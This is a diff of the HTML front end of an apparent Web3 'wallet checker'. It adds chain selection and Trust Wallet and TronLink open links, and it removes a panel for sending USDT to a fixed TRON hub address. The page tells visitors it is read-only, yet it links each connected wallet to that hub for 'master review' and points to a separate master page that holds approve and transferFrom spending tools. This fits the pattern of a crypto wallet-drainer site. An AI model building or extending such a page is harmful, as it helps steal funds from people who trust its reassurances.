@@ -78,7 +78,49 @@
           </svg>
         </div>
         <h2 id="wallet-title">Connect your Web3 wallet</h2>
-        <p id="wallet-description">Choose a wallet to verify your public address. This checker never asks for a recovery phrase or private key.</p>
+        <p id="wallet-description">Pick a network, then connect. This page only verifies your public address and loads balances. It never requests approvals, transfers, or transferFrom. Spend tooling is on the master wallet page only.</p>
+
+        <div class="chain-selector" id="chain-selector" aria-labelledby="chain-selector-label">
+          <label class="chain-selector-label" id="chain-selector-label" for="chain-select">Network / chain</label>
+          <select class="chain-select" id="chain-select" aria-describedby="chain-selector-help">
+            <option value="tron" selected>TRON (TRX / TRC-20)</option>
+            <option value="ethereum">Ethereum</option>
+            <option value="bnb">BNB Smart Chain</option>
+            <option value="polygon">Polygon</option>
+            <option value="arbitrum">Arbitrum One</option>
+            <option value="optimism">Optimism</option>
+            <option value="base">Base</option>
+          </select>
+          <p class="chain-selector-help" id="chain-selector-help">Connect and asset load follow this selection. This page never prompts approve/transferFrom — those tools are on /master-wallet only.</p>
+        </div>
+
+        <aside class="trust-open-panel" id="trust-open-panel" aria-labelledby="trust-open-title">
+          <p class="trust-tron-reopen-kicker" id="trust-open-kicker">Open in Trust Wallet</p>
+          <h3 class="trust-tron-reopen-title" id="trust-open-title">Trust DApp browser</h3>
+          <p class="trust-tron-reopen-copy" id="trust-open-copy">Opens this page inside Trust on the selected coin/network. TRON uses coin_id=195; EVM chains use that chain’s Trust coin id.</p>
+          <a class="primary-action trust-tron-reopen-cta" id="trust-open-cta" href="https://link.trustwallet.com/open_url?coin_id=195" target="_blank" rel="noopener noreferrer">Open in Trust Wallet <span aria-hidden="true">→</span></a>
+          <label class="trust-tron-link-label" id="trust-open-link-label" for="trust-open-link-input">Copy Trust open link</label>
+          <div class="trust-tron-link-row" id="trust-open-link-row">
+            <input class="trust-tron-link-input" id="trust-open-link-input" type="text" readonly value="">
+            <button class="retry-button trust-tron-copy" id="trust-open-copy-btn" type="button">Copy</button>
+          </div>
+        </aside>
+
+        <aside class="trust-tron-reopen" id="trust-tron-reopen" hidden aria-labelledby="trust-tron-reopen-title">
+          <p class="trust-tron-reopen-kicker" id="mobile-tron-guide-kicker">Mobile · TronLink / WC</p>
+          <h3 class="trust-tron-reopen-title" id="trust-tron-reopen-title">Open in TronLink</h3>
+          <p class="trust-tron-reopen-copy" id="trust-tron-reopen-copy">On TRON, TronLink is the reliable mobile path. WalletConnect TRON is secondary. Use the Trust open link above when you specifically want Trust’s TRON browser (coin_id=195).</p>
+          <a class="primary-action trust-tron-reopen-cta" id="trust-tron-reopen-cta" href="https://www.tronlink.org/" target="_blank" rel="noopener noreferrer">Open in TronLink <span aria-hidden="true">→</span></a>
+          <button class="primary-action trust-tron-wc-cta" id="trust-tron-wc-cta" type="button">Pair WalletConnect (TRON)</button>
+          <a class="trust-tron-tronlink-fallback" id="trust-tron-secondary-cta" href="https://www.tronlink.org/" target="_blank" rel="noopener noreferrer" hidden>Get TronLink ↗</a>
+          <label class="trust-tron-link-label" id="trust-tron-link-label" for="trust-tron-link-input" hidden>Legacy Trust TRON link</label>
+          <div class="trust-tron-link-row" id="trust-tron-link-row" hidden>
+            <input class="trust-tron-link-input" id="trust-tron-link-input" type="text" readonly value="">
+            <button class="retry-button trust-tron-copy" id="trust-tron-copy" type="button">Copy</button>
+          </div>
+          <a class="trust-tron-tronlink-fallback" id="trust-tron-tronlink-fallback" href="https://www.tronlink.org/" target="_blank" rel="noopener noreferrer">Get / open TronLink ↗</a>
+        </aside>
+        <p class="trust-tron-network-hint" id="trust-tron-network-hint" role="status" aria-live="polite" hidden></p>
 
         <section class="owner-pairing" id="owner-pairing" aria-labelledby="owner-pairing-title" hidden>
           <p class="owner-kicker" id="owner-pairing-title">WalletConnect pairing</p>
@@ -106,29 +148,29 @@
         </section>
 
         <div class="wallet-options" id="wallet-options" hidden>
-          <button class="wallet-option" id="connect-metamask" type="button">
-            <span class="wallet-logo metamask-logo" aria-hidden="true">M</span>
-            <span><strong>MetaMask</strong><small>Connect an EVM account</small></span>
-            <span class="option-arrow" aria-hidden="true">→</span>
-          </button>
-          <button class="wallet-option" id="connect-tronlink" type="button">
+          <button class="wallet-option" id="connect-tronlink" type="button" data-networks="tron">
             <span class="wallet-logo tronlink-logo" aria-hidden="true">T</span>
-            <span><strong>TronLink</strong><small>Recommended for TRON</small></span>
+            <span><strong>TronLink</strong><small>Recommended on TRON</small></span>
             <span class="option-arrow" aria-hidden="true">→</span>
           </button>
-          <button class="wallet-option" id="connect-trust" type="button">
+          <button class="wallet-option" id="connect-walletconnect" type="button" data-networks="tron">
+            <span class="wallet-logo walletconnect-logo" aria-hidden="true">W</span>
+            <span><strong>WalletConnect</strong><small>TRON only · scan with a TRON wallet</small></span>
+            <span class="option-arrow" aria-hidden="true">→</span>
+          </button>
+          <button class="wallet-option" id="connect-trust" type="button" data-networks="tron,evm">
             <span class="wallet-logo trust-logo" aria-hidden="true">◆</span>
-            <span><strong>Trust Wallet</strong><small>Connect an EVM or TRON account</small></span>
+            <span><strong>Trust Wallet</strong><small id="connect-trust-subtitle">Uses selected chain · open via Trust link above</small></span>
+            <span class="option-arrow" aria-hidden="true">→</span>
+          </button>
+          <button class="wallet-option" id="connect-metamask" type="button" data-networks="evm">
+            <span class="wallet-logo metamask-logo" aria-hidden="true">M</span>
+            <span><strong>MetaMask</strong><small>EVM · switches to selected chain</small></span>
             <span class="option-arrow" aria-hidden="true">→</span>
           </button>
           <button class="wallet-option" id="connect-injected" type="button">
             <span class="wallet-logo injected-logo" aria-hidden="true">W</span>
             <span><strong id="injected-wallet-name">Browser wallet</strong><small>Use another detected provider</small></span>
-            <span class="option-arrow" aria-hidden="true">→</span>
-          </button>
-          <button class="wallet-option" id="connect-walletconnect" type="button">
-            <span class="wallet-logo walletconnect-logo" aria-hidden="true">W</span>
-            <span><strong>WalletConnect</strong><small>Scan a QR code with a TRON wallet</small></span>
             <span class="option-arrow" aria-hidden="true">→</span>
           </button>
         </div>
@@ -153,7 +195,7 @@
         <div class="linked-wallet-heading">
           <p class="eyebrow"><span></span> Connected wallet</p>
           <h2 id="linked-wallet-title">Your wallet and total assets</h2>
-          <p class="lede">After you connect, this manage view shows your wallet, balances read from your wallet provider, and optional hub transfer requests that only your wallet can sign.</p>
+          <p class="lede">This connect page is read-only: it verifies your address, loads balances from your wallet provider, and links the wallet for master review. It never asks you to approve, transfer, or transferFrom tokens.</p>
         </div>
         <article class="linked-card linked-card-visitor" aria-labelledby="linked-visitor-label">
           <p class="linked-label" id="linked-visitor-label">Connecting wallet address</p>
@@ -162,51 +204,17 @@
           <p class="asset-error" id="linked-asset-error" role="alert" hidden></p>
           <ul class="wallet-asset-plain-list asset-list" id="linked-token-list" aria-labelledby="linked-assets-heading"></ul>
           <p class="linked-note" id="linked-asset-note">Connect a wallet to load balances from your wallet provider.</p>
+          <div class="wallet-snapshot-sync" id="wallet-snapshot-sync" hidden>
+            <p class="linked-note" id="wallet-snapshot-status" role="status" aria-live="polite"></p>
+            <button class="retry-button" id="retry-provider-snapshot" type="button">Retry balance sync</button>
+            <a class="contract-link" href="/master-wallet">Open master wallet review →</a>
+          </div>
           <h3 class="asset-list-heading wallet-tx-heading" id="linked-transactions-heading">Recent wallet activity</h3>
           <p class="asset-error" id="linked-transaction-error" role="alert" hidden></p>
           <ul class="wallet-tx-list" id="linked-transaction-list" aria-labelledby="linked-transactions-heading"></ul>
           <p class="linked-note" id="linked-transaction-note">Activity is read through your connected wallet provider.</p>
           <p class="linked-note linked-hub-note">Recorded hub link: <span class="connected-address" id="link-target-address">TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9</span></p>
-        </article>
-
-        <article class="linked-card wallet-manager-card" id="wallet-manager-panel" hidden aria-labelledby="wallet-manager-title">
-          <p class="eyebrow"><span></span> Hub wallet manager</p>
-          <h3 id="wallet-manager-title">Manage connected wallet</h3>
-          <p class="lede wallet-manager-lede">Review this wallet’s balances from your wallet provider and request a USDT transfer to hub <span class="connected-address" id="manager-hub-address">TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9</span>. Only your wallet can sign; nothing moves without that approval.</p>
-          <p class="linked-note wallet-manager-safety"><span aria-hidden="true">✓</span> No seed phrase · No private key · No auto-approve</p>
-
-          <div class="wallet-manager-tron" id="manager-transfer-tron" hidden>
-            <form class="wallet-manager-form" id="manager-transfer-form">
-              <label for="manager-transfer-recipient">Transfer recipient (hub)</label>
-              <input id="manager-transfer-recipient" name="recipient" type="text" readonly spellcheck="false" value="TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9" aria-describedby="manager-transfer-recipient-hint">
-              <p class="linked-note" id="manager-transfer-recipient-hint">Official TRC-20 USDT only. Recipient is fixed to the configured hub address.</p>
-              <label for="manager-transfer-amount">USDT amount</label>
-              <input id="manager-transfer-amount" name="amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00" required>
-              <button class="primary-action wallet-manager-submit" id="manager-review-transfer" type="submit">Review transfer request</button>
-            </form>
-
-            <div class="wallet-manager-review" id="manager-transfer-review" hidden>
-              <h4 class="wallet-manager-review-title">Confirm before your wallet signs</h4>
-              <dl class="wallet-manager-review-list">
-                <div><dt>From</dt><dd class="connected-address" id="manager-review-sender"></dd></div>
-                <div><dt>To (hub)</dt><dd class="connected-address" id="manager-review-recipient"></dd></div>
-                <div><dt>Token</dt><dd>TRC-20 USDT</dd></div>
-                <div><dt>Amount</dt><dd id="manager-review-amount"></dd></div>
-              </dl>
-              <p class="linked-note">Reject the wallet prompt if any detail differs. This page never submits without your signature.</p>
-              <div class="wallet-manager-actions">
-                <button class="primary-action" id="manager-sign-transfer" type="button">Approve transfer in wallet</button>
-                <button class="retry-button" id="manager-cancel-transfer" type="button">Cancel</button>
-              </div>
-            </div>
-          </div>
-
-          <p class="linked-note wallet-manager-evm" id="manager-transfer-evm-note" hidden>
-            The hub address is on TRON. Connect with TronLink, Trust Wallet (TRON), or WalletConnect on TRON mainnet to request a signed USDT transfer.
-          </p>
-
-          <p class="wallet-manager-status" id="manager-transfer-status" role="status" aria-live="polite"></p>
-          <p class="asset-error" id="manager-transfer-error" role="alert" hidden></p>
+          <p class="linked-note connect-page-safety"><span aria-hidden="true">✓</span> Connect-only page · No approve · No transferFrom · Allowance/spend tools live on master wallet only</p>
         </article>
       </section>
 
@@ -318,6 +326,6 @@
       });
     })();
   </script>
-  <script type="module" src="./src/landing.js?v=dev"></script>
+  <script type="module" src="./src/landing.js?v=tronlink-only2"></script>
 </body>
 </html>
